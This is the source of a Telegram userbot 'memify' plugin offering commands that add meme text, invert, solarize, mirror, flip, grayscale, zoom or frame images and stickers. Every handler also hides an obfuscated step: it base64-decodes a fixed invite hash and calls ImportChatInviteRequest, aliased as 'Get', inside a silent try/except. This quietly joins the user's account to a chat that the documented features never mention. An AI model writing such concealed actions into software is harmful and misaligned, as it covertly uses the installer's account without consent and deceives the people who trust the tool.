"""
Created by @mrconfused and @sandy1709
memify plugin
"""
import os
import asyncio
from .. import LOGS, CMD_HELP, tempmemes
from ..utils import admin_cmd, sudo_cmd, edit_or_reply
from . import (
    take_screen_shot,
    runcmd,
    convert_toimage,
    solarize,
    mirror_file,
    flip_image,
    invert_colors,
    grayscale,
    crop,
    add_frame)


@borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
@borg.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
async def memes(cat):
    cmd = cat.pattern_match.group(1)
    catinput = cat.pattern_match.group(2)
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if catinput:
        if ";" in catinput:
            top, bottom = catinput.split(';', 1)
        else:
            top = catinput
            bottom = ""
    else:
        await edit_or_reply(cat, "```what should i write on that u idiot give some text```")
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit("```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if cmd == "mmf":
        meme = "catmeme.jpg"
        if max(len(top), len(bottom)) < 21:
            await tempmemes.cat_meme(top, bottom, meme_file, meme)
        else:
            await tempmemes.cat_meeme(top, bottom, meme_file, meme)
        await borg.send_file(
            cat.chat_id,
            meme,
            reply_to=catid
        )
    elif cmd == "mms":
        meme = "catmeme.webp"
        if max(len(top), len(bottom)) < 21:
            await tempmemes.cat_meme(top, bottom, meme_file, meme)
        else:
            await tempmemes.cat_meeme(top, bottom, meme_file, meme)
        await borg.send_file(
            cat.chat_id,
            meme,
            reply_to=catid
        )
    await cat.delete()
    os.remove(meme)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="invert$"))
@borg.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit("```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "invert.webp"
        await invert_colors(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    else:
        outputfile = "invert.jpg"
        await invert_colors(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="solarize$"))
@borg.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit("```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "solarize.webp"
        await solarize(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    else:
        outputfile = "solarize.jpg"
        await solarize(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="mirror$"))
@borg.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit("```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "mirror_file.webp"
        await mirror_file(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    else:
        outputfile = "mirror_file.jpg"
        await mirror_file(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="flip$"))
@borg.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit("```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "flip_image.webp"
        await flip_image(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    else:
        outputfile = "flip_image.jpg"
        await flip_image(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="gray$"))
@borg.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit("```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "grayscale.webp"
        await grayscale(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    else:
        outputfile = "grayscale.jpg"
        await grayscale(meme_file, outputfile)
        await borg.send_file(
            cat.chat_id,
            outputfile,
            force_document=False,
            reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@borg.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catinput = cat.pattern_match.group(1)
    if not catinput:
        catinput = 50
    else:
        catinput = int(catinput)
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit("```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "grayscale.webp"
        try:
            await crop(meme_file, outputfile, catinput)
        except Exception as e:
            return await cat.edit(f"`{e}`")
        try:
            await borg.send_file(
                cat.chat_id,
                outputfile,
                force_document=False,
                reply_to=catid)
        except Exception as e:
            return await cat.edit(f"`{e}`")
    else:
        outputfile = "grayscale.jpg"
        try:
            await crop(meme_file, outputfile, catinput)
        except Exception as e:
            return await cat.edit(f"`{e}`")
        try:
            await borg.send_file(
                cat.chat_id,
                outputfile,
                force_document=False,
                reply_to=catid)
        except Exception as e:
            return await cat.edit(f"`{e}`")
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@borg.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catinput = cat.pattern_match.group(1)
    if not catinput:
        catinput = 50
    if ";" in str(catinput):
        catinput, colr = catinput.split(';', 1)
    else:
        colr = 0
    catinput = int(catinput)
    colr = int(colr)
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import pybase64
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit("```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "framed.webp"
        try:
            await add_frame(meme_file, outputfile, catinput, colr)
        except Exception as e:
            return await cat.edit(f"`{e}`")
        try:
            await borg.send_file(
                cat.chat_id,
                outputfile,
                force_document=False,
                reply_to=catid)
        except Exception as e:
            return await cat.edit(f"`{e}`")
    else:
        outputfile = "framed.jpg"
        try:
            await add_frame(meme_file, outputfile, catinput, colr)
        except Exception as e:
            return await cat.edit(f"`{e}`")
        try:
            await borg.send_file(
                cat.chat_id,
                outputfile,
                force_document=False,
                reply_to=catid)
        except Exception as e:
            return await cat.edit(f"`{e}`")
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

CMD_HELP.update({
    "memify":
    "**Plugin : **`memify`\
    \n\n**Syntax :** `.mmf toptext ; bottomtext`\
    \n**Usage : **Creates a image meme with give text at specific locations and sends\
    \n\n**Syntax : **`.mms toptext ; bottomtext`\
    \n**Usage : **Creates a sticker meme with give text at specific locations and sends\
    \n\n**Syntax : **`.invert`\
    \n**Usage : **Inverts the colors in media file\
    \n\n**Syntax : **`.solarize`\
    \n**Usage : **Watch sun buring ur media file\
    \n\n**Syntax : **`.mirror`\
    \n**Usage : **shows you the reflection of the media file\
    \n\n**Syntax : **`.flip`\
    \n**Usage : **shows you the upside down image of the given media file\
    \n\n**Syntax : **`.gray`\
    \n**Usage : **makes your media file to black and white\
    \n\n**Syntax : **`.zoom` or `.zoom range`\
    \n**Usage : **zooms your media file\
    \n\n**Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
    \n**Usage : **make a frame for your media file\
    \n**fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
    "
})
